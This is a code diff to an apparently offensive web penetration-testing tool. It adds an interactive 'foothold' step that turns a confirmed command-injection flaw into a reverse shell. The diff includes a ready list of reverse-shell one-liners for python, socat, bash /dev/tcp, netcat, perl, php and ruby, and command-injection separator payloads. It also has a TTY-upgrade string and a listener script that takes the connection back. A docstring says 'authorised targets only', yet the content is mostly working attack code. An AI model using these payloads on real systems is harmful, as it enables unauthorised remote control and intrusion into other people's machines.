@@ -2075,6 +2075,14 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"Authenticated admin RCE: {hits[0]}{mt}"[:140]}
         return None
 
+    # 2aa) foothold: a reverse shell was fired over a confirmed RCE channel
+    if sid == "foothold":
+        m = re.search(r"foothold: fired (.+)$", output)
+        if m:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"Reverse shell foothold: {m.group(1)}"[:140]}
+        return None
+
     # 3) info rules over -sC output
     low = output.lower()
     info = None
@@ -2716,7 +2724,8 @@ _EXPLOIT_STEPS = {
          "cms-scan"),
         ("Admin panel → RCE: upload plugin/theme, edit a template, or config code-exec",
          "admin-rce"),
-        "Land a webshell / reverse shell; stabilise; loot DB creds & config for reuse",
+        ("Land a webshell / reverse shell; stabilise; loot DB creds & config for reuse",
+         "foothold"),
     ],
     "smb": [
         # ── recon (no creds) ──
@@ -6060,6 +6069,26 @@ def _verify_rce_callback(target_ip: str, run_cmd, timeout: int = 8) -> "tuple":
     return got["ok"], f"{myip}:{cbport}"
 
 
+# command-injection separators, shared by cmdi-scan (detection) and foothold (which rebuilds
+# the exact wrapper from the label cmdi-scan recorded in the DB). CMD is spliced into the value.
+_CMDI_WRAPS = [
+    ("; ", lambda c: f"1;{c}"),
+    ("| ", lambda c: f"1|{c}"),
+    ("&& ", lambda c: f"1&&{c}"),
+    ("$(...)", lambda c: f"1$({c})"),
+    ("`...`", lambda c: f"1`{c}`"),
+    ("newline", lambda c: f"1\n{c}"),
+]
+_CMDI_TIME_WRAPS = [
+    ("; sleep", lambda n: f"1;sleep {n}"),
+    ("| sleep", lambda n: f"1|sleep {n}"),
+    ("&& sleep", lambda n: f"1&&sleep {n}"),
+    ("$(sleep)", lambda n: f"1$(sleep {n})"),
+    ("`sleep`", lambda n: f"1`sleep {n}`"),
+    ("& ping(win)", lambda n: f"1&ping -n {n + 1} 127.0.0.1"),
+]
+
+
 def _tool_cmdi_scan(ip: str, port: int, proto: str) -> str:
     """HTTP step tool: OS command injection on params (host + vhosts). Output-based uses a
     COMPUTED marker (echo pshOS$((a+b))) so only real shell arithmetic — not a reflected
@@ -6080,23 +6109,8 @@ def _tool_cmdi_scan(ip: str, port: int, proto: str) -> str:
     ctx = ssl._create_unverified_context()
     deadline = time.time() + _CMDI_DEADLINE
 
-    # separators → how to wrap a command CMD into the injected value
-    wraps = [
-        ("; ", lambda c: f"1;{c}"),
-        ("| ", lambda c: f"1|{c}"),
-        ("&& ", lambda c: f"1&&{c}"),
-        ("$(...)", lambda c: f"1$({c})"),
-        ("`...`", lambda c: f"1`{c}`"),
-        ("newline", lambda c: f"1\n{c}"),
-    ]
-    time_wraps = [
-        ("; sleep", lambda n: f"1;sleep {n}"),
-        ("| sleep", lambda n: f"1|sleep {n}"),
-        ("&& sleep", lambda n: f"1&&sleep {n}"),
-        ("$(sleep)", lambda n: f"1$(sleep {n})"),
-        ("`sleep`", lambda n: f"1`sleep {n}`"),
-        ("& ping(win)", lambda n: f"1&ping -n {n + 1} 127.0.0.1"),
-    ]
+    wraps = _CMDI_WRAPS
+    time_wraps = _CMDI_TIME_WRAPS
 
     def _get(hostval, path, param, value):
         conn = None
@@ -7835,6 +7849,287 @@ def _tool_admin_rce(ip: str, port: int, proto: str) -> str:
     return "\n".join(lines)
 
 
+# ── HTTP step 26: foothold — spawn & auto-upgrade a reverse shell via a confirmed RCE channel ──
+_FOOTHOLD_ENUM_TOOLS = ["python3", "python", "socat", "nc", "ncat", "perl", "php", "ruby", "bash",
+                        "script"]
+# (label, interpreter it needs, reverse-shell payload with {ip}/{port}, already-interactive-pty?)
+_REVSHELLS = [
+    ("python3 pty", "python3",
+     "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
+     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
+    ("python pty", "python",
+     "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
+     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
+    ("socat pty", "socat",
+     "socat tcp:{ip}:{port} exec:'bash -li',pty,stderr,setsid,sigint,sane", True),
+    ("bash /dev/tcp", "bash", "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", False),
+    ("nc -e", "nc", "nc {ip} {port} -e /bin/bash", False),
+    ("nc mkfifo", "nc",
+     "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f", False),
+    ("perl", "perl",
+     "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");"
+     "open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'", False),
+    ("php", "php",
+     "php -r '$s=fsockopen(\"{ip}\",{port});proc_open(\"/bin/bash -i\","
+     "array(0=>$s,1=>$s,2=>$s),$p);'", False),
+    ("ruby", "ruby",
+     "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
+     "exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'", False),
+]
+# self-selecting TTY upgrade sent to a dumb shell on connect: python3 → python → script → bash
+_FOOTHOLD_UPGRADE = (
+    "(command -v python3>/dev/null&&exec python3 -c 'import pty;pty.spawn(\"/bin/bash\")');"
+    "(command -v python>/dev/null&&exec python -c 'import pty;pty.spawn(\"/bin/bash\")');"
+    "(command -v script>/dev/null&&exec script -qc /bin/bash /dev/null);exec /bin/bash\n")
+
+_SMART_LISTENER_SRC = r'''
+import socket, sys, os, select, time
+LPORT = __LPORT__
+UPGRADE = __UPGRADE__
+srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind(("0.0.0.0", LPORT)); srv.listen(1)
+sys.stdout.write("[*] pshunter listener on 0.0.0.0:%d - waiting for the target...\n" % LPORT)
+sys.stdout.flush()
+conn, addr = srv.accept()
+sys.stdout.write("[+] shell from %s:%d\n" % addr); sys.stdout.flush()
+try:
+    cols, rows = os.get_terminal_size()
+except Exception:
+    cols, rows = 120, 30
+if UPGRADE:
+    conn.sendall(UPGRADE); time.sleep(0.6)
+conn.sendall(("stty rows %d cols %d 2>/dev/null; export TERM=xterm-256color; "
+              "export SHELL=/bin/bash\n" % (rows, cols)).encode())
+old = None
+try:
+    import termios, tty
+    old = termios.tcgetattr(0); tty.setraw(0)
+except Exception:
+    pass
+try:
+    while True:
+        r, _, _ = select.select([0, conn], [], [])
+        if 0 in r:
+            d = os.read(0, 1024)
+            if not d:
+                break
+            conn.sendall(d)
+        if conn in r:
+            d = conn.recv(4096)
+            if not d:
+                break
+            os.write(1, d)
+finally:
+    if old is not None:
+        try:
+            termios.tcsetattr(0, termios.TCSADRAIN, old)
+        except Exception:
+            pass
+    conn.close()
+sys.stdout.write("\n[*] session closed - press enter to close this tab\n")
+try:
+    input()
+except Exception:
+    pass
+'''
+
+
+def _parse_cmdi_vectors(ip: str, port: int, proto: str) -> list:
+    """(host, path, param, kind, label) confirmed command-injection vectors recorded by
+    cmdi-scan (`✗ CMDI /p?param  (echo-based, ; )` under a `[host]` section)."""
+    out = []
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "cmdi-scan":
+            host = ip
+            for ln in (output or "").splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                m = re.match(r"\s*✗ CMDI (\S+?)\?(\S+?)\s+\((\w+)-based,\s*(.+?)\)\s*$", ln)
+                if m:
+                    out.append((host, m.group(1), m.group(2), m.group(3), m.group(4)))
+    return out
+
+
+def _foothold_lhost(target_ip: str) -> "str | None":
+    """Our source IP toward the target (what the target must call back to)."""
+    import socket
+    try:
+        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        u.connect((target_ip, 9))
+        myip = u.getsockname()[0]
+        u.close()
+        return myip
+    except Exception:                                         # noqa: BLE001
+        return None
+
+
+def _foothold_channel(ip: str, port: int, proto: str):
+    """Rebuild a working command channel from a confirmed echo-based cmdi vector. Returns
+    (run(cmd)->output, fire(cmd)->None, description) or None. `run` captures stdout between
+    markers; `fire` launches a (backgrounded) command without waiting (for the reverse shell)."""
+    import http.client
+    import ssl
+    import urllib.parse
+    vecs = _parse_cmdi_vectors(ip, port, proto)
+    if not vecs:
+        return None
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    ctx = ssl._create_unverified_context()
+    wrapmap = dict(_CMDI_WRAPS)
+    dm = "pshFH"
+
+    def _get(host, path, param, value):
+        conn = None
+        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=12, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=12)
+            conn.request("GET", q, headers={"Host": host, "User-Agent": "pshunter"})
+            return conn.getresponse().read(200000).decode("utf-8", "replace")
+        except Exception:                                     # noqa: BLE001
+            return None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    for host, path, param, kind, label in vecs:
+        if kind != "echo":
+            continue                                          # need reflected output to drive it
+        wrap = wrapmap.get(label)
+        if not wrap:
+            continue
+
+        def run(cmd, _h=host, _p=path, _pa=param, _w=wrap):
+            body = _get(_h, _p, _pa, _w(f"echo {dm}$({cmd}){dm}"))
+            if not body:
+                return None
+            m = re.search(re.escape(dm) + r"(.*?)" + re.escape(dm), body, re.S)
+            return m.group(1) if m else None
+
+        if (run("id") or "").find("uid=") >= 0:
+            def fire(cmd, _h=host, _p=path, _pa=param, _w=wrap):
+                threading.Thread(target=lambda: _get(_h, _p, _pa, _w(cmd + " &")),
+                                 daemon=True).start()
+            return run, fire, f"cmdi {host}{path}?{param} ({label})"
+    return None
+
+
+def _enumerate_shells(run) -> set:
+    """Which interpreters exist on the target, probed live through the command channel."""
+    cmd = ("for b in " + " ".join(_FOOTHOLD_ENUM_TOOLS) +
+           "; do command -v $b >/dev/null 2>&1 && echo HAVE:$b; done")
+    return set(re.findall(r"HAVE:(\S+)", run(cmd) or ""))
+
+
+def _open_listener_terminal(script_path: str) -> "str | None":
+    """Open the smart listener in a new terminal window/tab. Returns the emulator used, or None
+    when headless (no display / no emulator) so the caller can fall back to inline instructions."""
+    term = next(((shutil.which(x), flag) for x, flag in _TERM_EMULATORS if shutil.which(x)),
+                (None, None))
+    if not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")) or not term[0]:
+        return None
+    binary, flag = term
+    q = shlex.quote(script_path)
+    inner = f"python3 {q}; rm -f {q}; exec ${{SHELL:-/bin/bash}}"
+    try:
+        subprocess.Popen([binary] + flag + ["sh", "-c", inner],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                         stdin=subprocess.DEVNULL, start_new_session=True)
+        return binary
+    except Exception:                                         # noqa: BLE001
+        return None
+
+
+def _tool_foothold(ip: str, port: int, proto: str) -> str:
+    """HTTP step-26 tool (INTERACTIVE): spawn and auto-upgrade a reverse shell over a confirmed
+    RCE channel. Rebuilds an echo-based cmdi vector from the DB, enumerates which interpreters
+    live on the target, lets the operator pick a viable payload, opens a smart auto-upgrading
+    listener in a new terminal, and fires the payload so the target connects back. Authorised
+    targets only. Requires a cmdi vector (run cmdi-scan first) — otherwise prints manual payloads."""
+    import time
+    import tempfile
+
+    lhost = _foothold_lhost(ip)
+    channel = _foothold_channel(ip, port, proto)
+
+    if not channel:
+        print(f"\n{YELLOW}no confirmed command channel{RESET} — run {BOLD}cmdi-scan (r 19){RESET} "
+              f"first, or paste a payload into a shell you already have.")
+        lh = lhost or "<YOUR_IP>"
+        print(f"{DIM}reverse shells (start {BOLD}nc -lvnp 4444{RESET}{DIM} on {lh}):{RESET}")
+        for label, _need, tpl, _pty in _REVSHELLS[:4]:
+            print(f"  {CYAN}{label:14}{RESET} {tpl.replace('{ip}', lh).replace('{port}', '4444')}")
+        return "foothold: no command channel (cmdi-scan first) — manual payloads shown"
+
+    run, fire, desc = channel
+    ctx_id = (run("id") or "").strip()
+    print(f"\n{GREEN}✓ command channel:{RESET} {desc}")
+    if ctx_id:
+        print(f"  {DIM}context:{RESET} {ctx_id}")
+    if not lhost:
+        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
+        return "foothold: no route to determine LHOST"
+
+    avail = _enumerate_shells(run)
+    print(f"  {DIM}on target:{RESET} {', '.join(sorted(avail)) or DIM + 'enumeration empty' + RESET}")
+    viable = [rs for rs in _REVSHELLS if not avail or rs[1] in avail] or _REVSHELLS
+
+    print(f"\n{BOLD}spawnable reverse shells{RESET} {DIM}(LHOST {lhost}){RESET}")
+    for i, (label, need, _tpl, pty) in enumerate(viable, 1):
+        tag = f"{GREEN}pty{RESET}" if pty else f"{DIM}dumb→auto-upgrade{RESET}"
+        print(f"  {CYAN}{i:>2}{RESET} {label:14} {DIM}({need}){RESET}  {tag}")
+    try:
+        raw = input(f"{BOLD}pick a shell #{RESET} (or 'q'): ").strip()
+    except (EOFError, KeyboardInterrupt):
+        return "foothold: aborted"
+    if not raw or raw.lower() == "q":
+        return "foothold: aborted (no shell chosen)"
+    if not raw.isdigit() or not 1 <= int(raw) <= len(viable):
+        return "foothold: invalid choice"
+    label, _need, tpl, pty = viable[int(raw) - 1]
+    try:
+        pin = input(f"{BOLD}LPORT{RESET} [4444]: ").strip()
+    except (EOFError, KeyboardInterrupt):
+        return "foothold: aborted"
+    lport = int(pin) if pin.isdigit() and 1 <= int(pin) <= 65535 else 4444
+
+    payload = tpl.replace("{ip}", lhost).replace("{port}", str(lport))
+    upgrade = b"" if pty else _FOOTHOLD_UPGRADE.encode()
+    src = (_SMART_LISTENER_SRC.replace("__LPORT__", str(lport))
+           .replace("__UPGRADE__", repr(upgrade)))
+    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
+    with os.fdopen(fd, "w") as fh:
+        fh.write(src)
+
+    used = _open_listener_terminal(spath)
+    if not used:
+        _safe_unlink(spath)
+        print(f"\n{YELLOW}headless — no terminal to open.{RESET} Run this listener yourself:")
+        print(f"  {BOLD}nc -lvnp {lport}{RESET}   {DIM}(on {lhost}){RESET}")
+        print(f"then this fires the shell. payload:\n  {DIM}{payload}{RESET}")
+        return f"foothold: headless — listener not opened; payload for {label} shown"
+
+    print(f"\n{GREEN}▶ listener opened in a new terminal{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
+    print(f"  {DIM}firing {label} through {desc}…{RESET}")
+    time.sleep(1.5)                                           # let the listener bind first
+    fire(payload)
+    print(f"  {DIM}→ check the new terminal for your{RESET} "
+          f"{GREEN}{'pty' if pty else 'auto-upgraded'} shell{RESET}"
+          f"{DIM}; if nothing lands, egress may be firewalled.{RESET}")
+    return (f"foothold: fired {label} reverse shell → {lhost}:{lport} "
+            f"(via {desc}); listener in a new terminal")
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("curl -sI (HTTP headers)", _tool_http_headers),
@@ -7862,6 +8157,7 @@ _STEP_TOOLS = {
     "idor-bac": ("IDOR / broken access control (stdlib, read-only, creds-aware)", _tool_idor_bac),
     "cms-scan": ("CMS scan → wpscan/droopescan + stdlib fallback (plugins/themes/users)", _tool_cms_scan),
     "admin-rce": ("admin panel → RCE (WordPress, creds-gated, inert, reversible)", _tool_admin_rce),
+    "foothold": ("foothold → spawn & auto-upgrade a reverse shell (interactive)", _tool_foothold),
 }
 
 def _mins(seconds: int) -> str:
@@ -7903,6 +8199,7 @@ _STEP_TOOL_RUNS = {
     "idor-bac":         ("Python", f"{_mins(_IDOR_DEADLINE)} min"),
     "cms-scan":         ("Python + wpscan/droopescan", f"{_mins(_CMS_DEADLINE)} min"),
     "admin-rce":        ("Python", f"{_mins(_ADMINRCE_DEADLINE)} min"),
+    "foothold":         ("Python", None),
 }
 
 
@@ -7980,6 +8277,20 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{DIM}step {n} has no tool — do it manually{RESET}")
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
+
+    if tool_key == "foothold":                                # interactive: menu + spawns a terminal
+        prev = fetch_step_status(ip, port, proto, key).get(n)
+        set_step_status(ip, port, proto, key, n, "running")
+        try:
+            out = runner(ip, port, proto)                     # runs in the foreground (reads input)
+        except Exception as exc:                              # noqa: BLE001
+            print(f"{RED}✗ foothold error: {exc}{RESET}")
+            set_step_status(ip, port, proto, key, n, prev)
+            return
+        save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
+        set_step_status(ip, port, proto, key, n, "done")
+        return
+
     prev = fetch_step_status(ip, port, proto, key).get(n)     # so an error can restore it
     set_step_status(ip, port, proto, key, n, "running")       # show ⏳ in the checklist now
     job = _new_job("5", f"{_label} ({ip}:{port}/{proto})", f"{tlabel} on {ip}:{port}/{proto}")
